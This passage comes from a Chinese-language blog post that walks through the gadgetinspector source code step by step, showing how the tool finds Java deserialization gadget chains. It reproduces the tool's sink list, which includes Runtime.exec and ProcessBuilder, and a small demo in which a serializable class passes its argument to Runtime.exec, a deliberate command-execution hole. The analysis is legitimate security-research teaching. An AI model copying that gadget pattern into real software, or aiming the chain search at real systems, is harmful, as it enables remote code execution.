LOGGER.debug("Calculating inheritance for " + (classMap.size()) + " classes..."); Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; implicitInheritance = new HashMap&lt;&gt;(); for (ClassReference classReference : classMap.values()) &#123; if (implicitInheritance.containsKey(classReference.getHandle())) &#123; throw new IllegalStateException("Already derived implicit classes for " + classReference.getName()); &#125; Set&lt;ClassReference.Handle&gt; allParents = new HashSet&lt;&gt;(); getAllParents(classReference, classMap, allParents);//获取当前类的所有父类 implicitInheritance.put(classReference.getHandle(), allParents); &#125; return new InheritanceMap(implicitInheritance); &#125; ... ... private static void getAllParents(ClassReference classReference, Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Set&lt;ClassReference.Handle&gt; allParents) &#123; Set&lt;ClassReference.Handle&gt; parents = new HashSet&lt;&gt;(); if (classReference.getSuperClass() != null) &#123; parents.add(new ClassReference.Handle(classReference.getSuperClass()));//父类 &#125; for (String iface : classReference.getInterfaces()) &#123; parents.add(new ClassReference.Handle(iface));//接口类 &#125; for (ClassReference.Handle immediateParent : parents) &#123; //获取间接父类，以及递归获取间接父类的父类 ClassReference parentClassReference = classMap.get(immediateParent); if (parentClassReference == null) &#123; LOGGER.debug("No class id for " + immediateParent.getName()); continue; &#125; allParents.add(parentClassReference.getHandle()); getAllParents(parentClassReference, classMap, allParents); &#125; &#125; ... ...&#125; 这一步的结果保存到了inheritanceMap.dat： 类 直接父类+间接父类 com/sun/javaws/OperaPreferences$PreferenceSection$PreferenceEntryIterator java/lang/Object、java/util/Iterator com/sun/java/swing/plaf/windows/WindowsLookAndFeel$XPValue java/lang/Object、javax/swing/UIDefaults$ActiveValue Step2 生成passthrough数据流这里的passthrough数据流指的是每个方法的返回结果与方法参数的关系，这一步生成的数据会在生成passthrough调用图时用到。 以作者给出的demo为例，先从宏观层面判断下： FnConstant.invoke返回值与参数this(参数0，因为序列化时类的所有成员我们都能控制，所以所有成员变量都视为0参)、arg(参数1)的关系： 与this的关系：返回了this.value，即与0参有关系 与arg的关系：返回值与arg没有任何关系，即与1参没有关系 结论就是FnConstant.invoke与参数0有关，表示为FnConstant.invoke()-&gt;0 Fndefault.invoke返回值与参数this(参数0)、arg(参数1)的关系： 与this的关系：返回条件的第二个分支与this.f有关系，即与0参有关系 与arg的关系：返回条件的第一个分支与arg有关系，即与1参有关系 结论就是FnConstant.invoke与0参，1参都有关系，表示为Fndefault.invoke()-&gt;0、Fndefault.invoke()-&gt;1 在这一步中，gadgetinspector是利用ASM来进行方法字节码的分析，主要逻辑是在类PassthroughDiscovery和TaintTrackingMethodVisitor中。特别是TaintTrackingMethodVisitor，它通过标记追踪JVM虚拟机在执行方法时的stack和localvar，并最终得到返回结果是否可以被参数标记污染。 核心实现代码（TaintTrackingMethodVisitor涉及到字节码分析，暂时先不看）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public class PassthroughDiscovery &#123; private static final Logger LOGGER = LoggerFactory.getLogger(PassthroughDiscovery.class); private final Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodCalls = new HashMap&lt;&gt;(); private Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow; public void discover(final ClassResourceEnumerator classResourceEnumerator, final GIConfig config) throws IOException &#123; Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();//load之前保存的methods.dat Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();//load之前保存的classes.dat InheritanceMap inheritanceMap = InheritanceMap.load();//load之前保存的inheritanceMap.dat Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator);//查找一个方法中包含的子方法 List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls();//对所有方法构成的图执行逆拓扑排序 passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods, config.getSerializableDecider(methodMap, inheritanceMap));//计算生成passthrough数据流，涉及到字节码分析 &#125; ... ... private List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123; Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = new HashMap&lt;&gt;(); for (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123; MethodReference.Handle method = entry.getKey(); outgoingReferences.put(method, new HashSet&lt;&gt;(entry.getValue())); &#125; // 对所有方法构成的图执行逆拓扑排序 LOGGER.debug("Performing topological sort..."); Set&lt;MethodReference.Handle&gt; dfsStack = new HashSet&lt;&gt;(); Set&lt;MethodReference.Handle&gt; visitedNodes = new HashSet&lt;&gt;(); List&lt;MethodReference.Handle&gt; sortedMethods = new ArrayList&lt;&gt;(outgoingReferences.size()); for (MethodReference.Handle root : outgoingReferences.keySet()) &#123; dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root); &#125; LOGGER.debug(String.format("Outgoing references %d, sortedMethods %d", outgoingReferences.size(), sortedMethods.size())); return sortedMethods; &#125; ... ... private static void dfsTsort(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences, List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes, Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node) &#123; if (stack.contains(node)) &#123;//防止在dfs一条方法调用链中进入循环 return; &#125; if (visitedNodes.contains(node)) &#123;//防止对某个方法及子方法重复排序 return; &#125; Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node); if (outgoingRefs == null) &#123; return; &#125; stack.add(node); for (MethodReference.Handle child : outgoingRefs) &#123; dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child); &#125; stack.remove(node); visitedNodes.add(node); sortedMethods.add(node); &#125;&#125; 拓扑排序 有向无环图（DAG）才有拓扑排序，非 DAG 图没有拓扑排序。 当有向无环图满足以下条件时： 每一个顶点出现且只出现一次 若A在序列中排在B的前面，则在图中不存在从B到A的路径 这样的图，是一个拓扑排序的图。树结构其实可以转化为拓扑排序，而拓扑排序 不一定能够转化为树。 以上面的拓扑排序图为例，用一个字典表示图结构 1234567graph = &#123; &quot;a&quot;: [&quot;b&quot;,&quot;d&quot;], &quot;b&quot;: [&quot;c&quot;], &quot;d&quot;: [&quot;e&quot;,&quot;c&quot;], &quot;e&quot;: [&quot;c&quot;], &quot;c&quot;: [],&#125; 代码实现 123456789101112131415161718192021222324252627graph = &#123; "a": ["b","d"], "b": ["c"], "d": ["e","c"], "e": ["c"], "c": [],&#125;def TopologicalSort(graph): degrees = dict((u, 0) for u in graph) for u in graph: for v in graph[u]: degrees[v] += 1 #入度为0的插入队列 queue = [u for u in graph if degrees[u] == 0] res = [] while queue: u = queue.pop() res.append(u) for v in graph[u]: # 移除边，即将当前元素相关元素的入度-1 degrees[v] -= 1 if degrees[v] == 0: queue.append(v) return resprint(TopologicalSort(graph)) # ['a', 'd', 'e', 'b', 'c'] 但是在方法的调用中，我们希望最后的结果是c、b、e、d、a，这一步需要逆拓扑排序，正向排序使用的BFS，那么得到相反结果可以使用DFS。为什么在方法调用中需要使用逆拓扑排序呢，这与生成passthrough数据流有关。看下面一个例子： 123456... public String parentMethod(String arg)&#123; String vul = Obj.childMethod(arg); return vul; &#125;... 那么这里arg与返回值到底有没有关系呢？假设Obj.childMethod为 12345... public String childMethod(String carg)&#123; return carg.toString(); &#125;... 由于childMethod的返回值carg与有关，那么可以判定parentMethod的返回值与参数arg是有关系的。所以如果存在子方法调用并传递了父方法参数给子方法时，需要先判断子方法返回值与子方法参数的关系。因此需要让子方法的判断在前面，这就是为什么要进行逆拓扑排序。 从下图可以看出outgoingReferences的数据结构为： 123456&#123; method1:(method2,method3,method4), method5:(method1,method6), ...&#125; 而这个结构正好适合逆拓扑排序 但是上面说拓扑排序时不能形成环，但是在方法调用中肯定是会存在环的。作者是如何避免的呢？ 在上面的dfsTsort实现代码中可以看到使用了stack和visitedNodes，stack保证了在进行逆拓扑排序时不会形成环，visitedNodes避免了重复排序。使用如下一个调用图来演示过程： 从图中可以看到有环med1-&gt;med2-&gt;med6-&gt;med1，并且有重复的调用med3，严格来说并不能进行逆拓扑排序，但是通过stack、visited记录访问过的方法，就能实现逆拓扑排序。为了方便解释把上面的图用一个树来表示： 对上图进行逆拓扑排序（DFS方式）： 从med1开始，先将med1加入stack中，此时stack、visited、sortedmethods状态如下： med1还有子方法？有，继续深度遍历。将med2放入stack，此时的状态： med2有子方法吗？有，继续深度遍历。将med3放入stack，此时的状态： med3有子方法吗？有，继续深度遍历。将med7放入stack，此时的状态： med7有子方法吗？没有，从stack中弹出med7并加入visited和sortedmethods，此时的状态： 回溯到上一层，med3还有其他子方法吗？有，med8，将med8放入stack，此时的状态： med8还有子方法吗？没有，弹出stack，加入visited与sortedmethods，此时的状态： 回溯到上一层，med3还有其他子方法吗？没有了，弹出stack，加入visited与sortedmethods，此时的状态： 回溯到上一层，med2还有其他子方法吗？有，med6，将med6加入stack，此时的状态： med6还有子方法吗？有，med1，med1在stack中？不加入，抛弃。此时状态和上一步一样 回溯到上一层，med6还有其他子方法吗？没有了，弹出stack，加入visited和sortedmethods，此时的状态： 回溯到上一层，med2还有其他子方法吗？没有了，弹出stack，加入visited和sortedmethods，此时的状态： 回溯到上一层，med1还有其他子方法吗？有，med3，med3在visited中？在，抛弃。 回溯到上一层，med1还有其他子方法吗？有，med4，将med4加入stack，此时的状态： med4还有其他子方法吗？没有，弹出stack，加入visited和sortedmethods中，此时的状态： 回溯到上一层，med1还有其他子方法吗？没有了，弹出stack，加入visited和sortedmethods中，此时的状态（即最终状态）： 所以最后的逆拓扑排序结果为：med7、med8、med3、med6、med2、med4、med1。 生成passthrough数据流 在calculatePassthroughDataflow中遍历了sortedmethods，并通过字节码分析，生成了方法返回值与参数关系的passthrough数据流。注意到下面的序列化决定器，作者内置了三种：JDK、Jackson、Xstream，会根据具体的序列化决定器判定决策过程中的类是否符合对应库的反序列化要求，不符合的就跳过： 对于JDK(ObjectInputStream)，类否继承了Serializable接口 对于Jackson，类是否存在0参构造器 对于Xstream，类名能否作为有效的XML标签 生成passthrough数据流代码： 1234567891011121314151617181920212223242526272829... private static Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; calculatePassthroughDataflow(Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName, Map&lt;ClassReference.Handle, ClassReference&gt; classMap, InheritanceMap inheritanceMap, List&lt;MethodReference.Handle&gt; sortedMethods, SerializableDecider serializableDecider) throws IOException &#123; final Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = new HashMap&lt;&gt;(); for (MethodReference.Handle method : sortedMethods) &#123;//依次遍历sortedmethods，并且每个方法的子方法判定总在这个方法之前，这是通过的上面的逆拓扑排序实现的。 if (method.getName().equals("&lt;clinit&gt;")) &#123; continue; &#125; ClassResourceEnumerator.ClassResource classResource = classResourceByName.get(method.getClassReference().getName()); try (InputStream inputStream = classResource.getInputStream()) &#123; ClassReader cr = new ClassReader(inputStream); try &#123; PassthroughDataflowClassVisitor cv = new PassthroughDataflowClassVisitor(classMap, inheritanceMap, passthroughDataflow, serializableDecider, Opcodes.ASM6, method); cr.accept(cv, ClassReader.EXPAND_FRAMES);//通过结合classMap、inheritanceMap、已判定出的passthroughDataflow结果、序列化决定器信息来判定当前method的返回值与参数的关系 passthroughDataflow.put(method, cv.getReturnTaint());//将判定后的method与有关系的污染点加入passthroughDataflow &#125; catch (Exception e) &#123; LOGGER.error("Exception analyzing " + method.getClassReference().getName(), e); &#125; &#125; catch (IOException e) &#123; LOGGER.error("Unable to analyze " + method.getClassReference().getName(), e); &#125; &#125; return passthroughDataflow; &#125;... 最后生成了passthrough.dat： 类名 方法名 方法描述 污点 java/util/Collections$CheckedNavigableSet tailSet (Ljava/lang/Object;)Ljava/util/NavigableSet; 0,1 java/awt/RenderingHints put (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object; 0,1,2 Step3 枚举passthrough调用图这一步和上一步类似，gadgetinspector 会再次扫描全部的Java方法，但检查的不再是参数与返回结果的关系，而是方法的参数与其所调用的子方法的关系，即子方法的参数是否可以被父方法的参数所影响。那么为什么要进行上一步的生成passthrough数据流呢？由于这一步的判断也是在字节码分析中，所以这里只能先进行一些猜测，如下面这个例子： 1234567891011... private MyObject obj; public void parentMethod(Object arg)&#123; ... TestObject obj1 = new TestObject(); Object obj2 = obj1.childMethod1(arg); this.obj.childMethod(obj2); ... &#125;... 如果不进行生成passthrough数据流操作，就无法判断TestObject.childMethod1的返回值是否会受到参数1的影响，也就无法继续判断parentMethod的arg参数与子方法MyObject.childmethod的参数传递关系。 作者给出的例子： AbstractTableModel$ff19274a.hashcode与子方法IFn.invoke： AbstractTableModel$ff19274a.hashcode的this(0参)传递给了IFn.invoke的1参，表示为0-&gt;IFn.invoke()@1 由于f是通过this.__clojureFnMap(0参)获取的，而f又为IFn.invoke()的this(0参)，即AbstractTableModel$ff19274a.hashcode的0参传递给了IFn.invoke的0参，表示为0-&gt;IFn.invoke()@0 FnCompose.invoke与子方法IFn.invoke： FnCompose.invoked的arg(1参)传递给了IFn.invoke的1参，表示为1-&gt;IFn.invoke()@1 f1为FnCompose的属性(this，0参)，被做为了IFn.invoke的this(0参数)传递，表示为0-&gt;IFn.invoke()@1 f1.invoke(arg)做为一个整体被当作1参传递给了IFn.invoke，由于f1在序列化时我们可以控制具体是IFn的哪个实现类，所以具体调用哪个实现类的invoke也相当于能够控制，即f1.invoke(arg)这个整体可以视为0参数传递给了IFn.invoke的1参(这里只是进行的简单猜测，具体实现在字节码分析中，可能也体现了作者说的合理的风险判断吧)，表示为0-&gt;IFn.invoke()@1 在这一步中，gadgetinspector也是利用ASM来进行字节码的分析，主要逻辑是在类CallGraphDiscovery和ModelGeneratorClassVisitor中。在ModelGeneratorClassVisitor中通过标记追踪JVM虚拟机在执行方法时的stack和localvar，最终得到方法的参数与其所调用的子方法的参数传递关系。 生成passthrough调用图代码（暂时省略ModelGeneratorClassVisitor的实现，涉及到字节码分析）： 12345678910111213141516171819202122232425public class CallGraphDiscovery &#123; private static final Logger LOGGER = LoggerFactory.getLogger(CallGraphDiscovery.class); private final Set&lt;GraphCall&gt; discoveredCalls = new HashSet&lt;&gt;(); public void discover(final ClassResourceEnumerator classResourceEnumerator, GIConfig config) throws IOException &#123; Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();//加载所有方法 Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();//加载所有类 InheritanceMap inheritanceMap = InheritanceMap.load();//加载继承图 Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = PassthroughDiscovery.load();//加载passthrough数据流 SerializableDecider serializableDecider = config.getSerializableDecider(methodMap, inheritanceMap);//序列化决定器 for (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123; try (InputStream in = classResource.getInputStream()) &#123; ClassReader cr = new ClassReader(in); try &#123; cr.accept(new ModelGeneratorClassVisitor(classMap, inheritanceMap, passthroughDataflow, serializableDecider, Opcodes.ASM6), ClassReader.EXPAND_FRAMES);//通过结合classMap、inheritanceMap、passthroughDataflow结果、序列化决定器信息来判定当前method参数与子方法传递调用关系 &#125; catch (Exception e) &#123; LOGGER.error("Error analyzing: " + classResource.getName(), e); &#125; &#125; &#125; &#125; 最后生成了passthrough.dat： 父方法类名 父方法 父方法描述 子方法类名 子方法子 方法描述 父方法第几参 参数对象的哪个field被传递 子方法第几参 java/io/PrintStream write (Ljava/lang/String;)V java/io/OutputStream flush ()V 0 out 0 javafx/scene/shape/Shape setSmooth (Z)V javafx/scene/shape/Shape smoothProperty ()Ljavafx/beans/property/BooleanProperty; 0 0 Step4 搜索可用的source这一步会根据已知的反序列化漏洞的入口，检查所有可以被触发的方法。例如，在利用链中使用代理时，任何可序列化并且是java/lang/reflect/InvocationHandler子类的invoke方法都可以视为source。这里还会根据具体的反序列化库决定类是否能被序列化。 搜索可用的source： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public class SimpleSourceDiscovery extends SourceDiscovery &#123; @Override public void discover(Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap) &#123; final SerializableDecider serializableDecider = new SimpleSerializableDecider(inheritanceMap); for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals("finalize") &amp;&amp; method.getDesc().equals("()V")) &#123; addDiscoveredSource(new Source(method, 0)); &#125; &#125; &#125; // 如果类实现了readObject，则传入的ObjectInputStream被认为是污染的 for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals("readObject") &amp;&amp; method.getDesc().equals("(Ljava/io/ObjectInputStream;)V")) &#123; addDiscoveredSource(new Source(method, 1)); &#125; &#125; &#125; // 使用代理技巧时，任何扩展了serializable and InvocationHandler的类会受到污染。 for (ClassReference.Handle clazz : classMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(clazz)) &amp;&amp; inheritanceMap.isSubclassOf(clazz, new ClassReference.Handle("java/lang/reflect/InvocationHandler"))) &#123; MethodReference.Handle method = new MethodReference.Handle( clazz, "invoke", "(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;"); addDiscoveredSource(new Source(method, 0)); &#125; &#125; // hashCode（）或equals（）是将对象放入HashMap的标准技巧的可访问入口点 for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123; if (method.getName().equals("hashCode") &amp;&amp; method.getDesc().equals("()I")) &#123; addDiscoveredSource(new Source(method, 0)); &#125; if (method.getName().equals("equals") &amp;&amp; method.getDesc().equals("(Ljava/lang/Object;)Z")) &#123; addDiscoveredSource(new Source(method, 0)); addDiscoveredSource(new Source(method, 1)); &#125; &#125; &#125; // 使用比较器代理，可以跳转到任何groovy Closure的call()/doCall()方法，所有的args都被污染 // https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java for (MethodReference.Handle method : methodMap.keySet()) &#123; if (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference())) &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), new ClassReference.Handle("groovy/lang/Closure")) &amp;&amp; (method.getName().equals("call") || method.getName().equals("doCall"))) &#123; addDiscoveredSource(new Source(method, 0)); Type[] methodArgs = Type.getArgumentTypes(method.getDesc()); for (int i = 0; i &lt; methodArgs.length; i++) &#123; addDiscoveredSource(new Source(method, i + 1)); &#125; &#125; &#125; &#125;... 这一步的结果会保存在文件sources.dat中: 类 方法 方法描述 污染参数 java/awt/color/ICC_Profile finalize ()V 0 java/lang/Enum readObject (Ljava/io/ObjectInputStream;)V 1 Step5 搜索生成调用链这一步会遍历全部的source，并在callgraph.dat中递归查找所有可以继续传递污点参数的子方法调用，直至遇到sink中的方法。 搜索生成调用链： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120public class GadgetChainDiscovery &#123; private static final Logger LOGGER = LoggerFactory.getLogger(GadgetChainDiscovery.class); private final GIConfig config; public GadgetChainDiscovery(GIConfig config) &#123; this.config = config; &#125; public void discover() throws Exception &#123; Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods(); InheritanceMap inheritanceMap = InheritanceMap.load(); Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations( inheritanceMap, methodMap);//得到方法的所有子类方法实现（被子类重写的方法） final ImplementationFinder implementationFinder = config.getImplementationFinder( methodMap, methodImplMap, inheritanceMap); //将方法的所有子类方法实现保存到methodimpl.dat try (Writer writer = Files.newBufferedWriter(Paths.get("methodimpl.dat"))) &#123; for (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123; writer.write(entry.getKey().getClassReference().getName()); writer.write("\t"); writer.write(entry.getKey().getName()); writer.write("\t"); writer.write(entry.getKey().getDesc()); writer.write("\n"); for (MethodReference.Handle method : entry.getValue()) &#123; writer.write("\t"); writer.write(method.getClassReference().getName()); writer.write("\t"); writer.write(method.getName()); writer.write("\t"); writer.write(method.getDesc()); writer.write("\n"); &#125; &#125; &#125; //方法调用map，key为父方法，value为子方法与父方法参数传递关系 Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = new HashMap&lt;&gt;(); for (GraphCall graphCall : DataLoader.loadData(Paths.get("callgraph.dat"), new GraphCall.Factory())) &#123; MethodReference.Handle caller = graphCall.getCallerMethod(); if (!graphCallMap.containsKey(caller)) &#123; Set&lt;GraphCall&gt; graphCalls = new HashSet&lt;&gt;(); graphCalls.add(graphCall); graphCallMap.put(caller, graphCalls); &#125; else &#123; graphCallMap.get(caller).add(graphCall); &#125; &#125; //exploredMethods保存在调用链从查找过程中已经访问过的方法节点，methodsToExplore保存调用链 Set&lt;GadgetChainLink&gt; exploredMethods = new HashSet&lt;&gt;(); LinkedList&lt;GadgetChain&gt; methodsToExplore = new LinkedList&lt;&gt;(); //加载所有sources，并将每个source作为每条链的第一个节点 for (Source source : DataLoader.loadData(Paths.get("sources.dat"), new Source.Factory())) &#123; GadgetChainLink srcLink = new GadgetChainLink(source.getSourceMethod(), source.getTaintedArgIndex()); if (exploredMethods.contains(srcLink)) &#123; continue; &#125; methodsToExplore.add(new GadgetChain(Arrays.asList(srcLink))); exploredMethods.add(srcLink); &#125; long iteration = 0; Set&lt;GadgetChain&gt; discoveredGadgets = new HashSet&lt;&gt;(); //使用广度优先搜索所有从source到sink的调用链 while (methodsToExplore.size() &gt; 0) &#123; if ((iteration % 1000) == 0) &#123; LOGGER.info("Iteration " + iteration + ", Search space: " + methodsToExplore.size()); &#125; iteration += 1; GadgetChain chain = methodsToExplore.pop();//从队首弹出一条链 GadgetChainLink lastLink = chain.links.get(chain.links.size()-1);//取这条链最后一个节点 Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);//获取当前节点方法所有子方法与当前节点方法参数传递关系 if (methodCalls != null) &#123; for (GraphCall graphCall : methodCalls) &#123; if (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123; //如果当前节点方法的污染参数与当前子方法受父方法参数影响的Index不一致则跳过 continue; &#125; Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());//获取子方法所在类的所有子类重写方法 for (MethodReference.Handle methodImpl : allImpls) &#123; GadgetChainLink newLink = new GadgetChainLink(methodImpl, graphCall.getTargetArgIndex());//新方法节点 if (exploredMethods.contains(newLink)) &#123; //如果新方法已近被访问过了，则跳过,这里能减少开销。但是这一步跳过会使其他链/分支链经过此节点时，由于已经此节点被访问过了，链会在这里断掉。那么如果这个条件去掉就能实现找到所有链了吗？这里去掉会遇到环状问题，造成路径无限增加... continue; &#125; GadgetChain newChain = new GadgetChain(chain, newLink);//新节点与之前的链组成新链 if (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;//如果到达了sink，则加入discoveredGadgets discoveredGadgets.add(newChain); &#125; else &#123; //新链加入队列 methodsToExplore.add(newChain); //新节点加入已访问集合 exploredMethods.add(newLink); &#125; &#125; &#125; &#125; &#125; //保存搜索到的利用链到gadget-chains.txt try (OutputStream outputStream = Files.newOutputStream(Paths.get("gadget-chains.txt")); Writer writer = new OutputStreamWriter(outputStream, StandardCharsets.UTF_8)) &#123; for (GadgetChain chain : discoveredGadgets) &#123; printGadgetChain(writer, chain); &#125; &#125; LOGGER.info("Found &#123;&#125; gadget chains.", discoveredGadgets.size()); &#125;... 作者给出的sink方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879private boolean isSink(MethodReference.Handle method, int argIndex, InheritanceMap inheritanceMap) &#123; if (method.getClassReference().getName().equals("java/io/FileInputStream") &amp;&amp; method.getName().equals("&lt;init&gt;")) &#123; return true; &#125; if (method.getClassReference().getName().equals("java/io/FileOutputStream") &amp;&amp; method.getName().equals("&lt;init&gt;")) &#123; return true; &#125; if (method.getClassReference().getName().equals("java/nio/file/Files") &amp;&amp; (method.getName().equals("newInputStream") || method.getName().equals("newOutputStream") || method.getName().equals("newBufferedReader") || method.getName().equals("newBufferedWriter"))) &#123; return true; &#125; if (method.getClassReference().getName().equals("java/lang/Runtime") &amp;&amp; method.getName().equals("exec")) &#123; return true; &#125; /* if (method.getClassReference().getName().equals("java/lang/Class") &amp;&amp; method.getName().equals("forName")) &#123; return true; &#125; if (method.getClassReference().getName().equals("java/lang/Class") &amp;&amp; method.getName().equals("getMethod")) &#123; return true; &#125; */ // If we can invoke an arbitrary method, that's probably interesting (though this doesn't assert that we // can control its arguments). Conversely, if we can control the arguments to an invocation but not what // method is being invoked, we don't mark that as interesting. if (method.getClassReference().getName().equals("java/lang/reflect/Method") &amp;&amp; method.getName().equals("invoke") &amp;&amp; argIndex == 0) &#123; return true; &#125; if (method.getClassReference().getName().equals("java/net/URLClassLoader") &amp;&amp; method.getName().equals("newInstance")) &#123; return true; &#125; if (method.getClassReference().getName().equals("java/lang/System") &amp;&amp; method.getName().equals("exit")) &#123; return true; &#125; if (method.getClassReference().getName().equals("java/lang/Shutdown") &amp;&amp; method.getName().equals("exit")) &#123; return true; &#125; if (method.getClassReference().getName().equals("java/lang/Runtime") &amp;&amp; method.getName().equals("exit")) &#123; return true; &#125; if (method.getClassReference().getName().equals("java/nio/file/Files") &amp;&amp; method.getName().equals("newOutputStream")) &#123; return true; &#125; if (method.getClassReference().getName().equals("java/lang/ProcessBuilder") &amp;&amp; method.getName().equals("&lt;init&gt;") &amp;&amp; argIndex &gt; 0) &#123; return true; &#125; if (inheritanceMap.isSubclassOf(method.getClassReference(), new ClassReference.Handle("java/lang/ClassLoader")) &amp;&amp; method.getName().equals("&lt;init&gt;")) &#123; return true; &#125; if (method.getClassReference().getName().equals("java/net/URL") &amp;&amp; method.getName().equals("openStream")) &#123; return true; &#125; // Some groovy-specific sinks if (method.getClassReference().getName().equals("org/codehaus/groovy/runtime/InvokerHelper") &amp;&amp; method.getName().equals("invokeMethod") &amp;&amp; argIndex == 1) &#123; return true; &#125; if (inheritanceMap.isSubclassOf(method.getClassReference(), new ClassReference.Handle("groovy/lang/MetaClass")) &amp;&amp; Arrays.asList("invokeMethod", "invokeConstructor", "invokeStaticMethod").contains(method.getName())) &#123; return true; &#125; return false; &#125; 对于每个入口节点来说，其全部子方法调用、孙子方法调用等等递归下去，就构成了一棵树。之前的步骤所做的，就相当于生成了这颗树，而这一步所做的，就是从根节点出发，找到一条通往叶子节点的道路，使得这个叶子节点正好是我们所期望的sink方法。gadgetinspector对树的遍历采用的是广度优先(BFS)，而且对于已经检查过的节点会直接跳过，这样减少了运行开销，避免了环路，但是丢掉了很多其他链。 这个过程看起来就像下面这样： 通过污点的传递，最终找到从source-&gt;sink的利用链 注：targ表示污染参数的index，0-&gt;1这样的表示父方法的0参传递给了子方法的1参 样例分析现在根据作者的样例写个具体的demo实例来测试下上面这些步骤。 demo如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103IFn.java: package com.demo.ifn; import java.io.IOException; public interface IFn &#123; public Object invokeCall(Object arg) throws IOException; &#125;FnEval.java package com.demo.ifn; import java.io.IOException; import java.io.Serializable; public class FnEval implements IFn, Serializable &#123; public FnEval() &#123; &#125; public Object invokeCall(Object arg) throws IOException &#123; return Runtime.getRuntime().exec((String) arg); &#125; &#125;FnConstant.java: package com.demo.ifn; import java.io.Serializable; public class FnConstant implements IFn , Serializable &#123; private Object value; public FnConstant(Object value) &#123; this.value = value; &#125; public Object invokeCall(Object arg) &#123; return value; &#125; &#125;FnCompose.java: package com.demo.ifn; import java.io.IOException; import java.io.Serializable; public class FnCompose implements IFn, Serializable &#123; private IFn f1, f2; public FnCompose(IFn f1, IFn f2) &#123; this.f1 = f1; this.f2 = f2; &#125; public Object invokeCall(Object arg) throws IOException &#123; return f2.invokeCall(f1.invokeCall(arg)); &#125; &#125;TestDemo.java: package com.demo.ifn; public class TestDemo &#123; //测试拓扑排序的正确性 private String test; public String pMethod(String arg)&#123; String vul = cMethod(arg); return vul; &#125; public String cMethod(String arg)&#123; return arg.toUpperCase(); &#125; &#125;AbstractTableModel.java: package com.demo.model; import com.demo.ifn.IFn; import java.io.IOException; import java.io.Serializable; import java.util.HashMap; public class AbstractTableModel implements Serializable &#123; private HashMap&lt;String, IFn&gt; __clojureFnMap; public AbstractTableModel(HashMap&lt;String, IFn&gt; clojureFnMap) &#123; this.__clojureFnMap = clojureFnMap; &#125; public int hashCode() &#123; IFn f = __clojureFnMap.get("hashCode"); try &#123; f.invokeCall(this); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return this.__clojureFnMap.hashCode() + 1; &#125; &#125; 注：下面截图中数据的顺序做了调换，同时数据也只给出com/demo中的数据 Step1 枚举全部类及每个类所有方法classes.dat: methods.dat: Step2 生成passthrough数据流passthrough.dat: 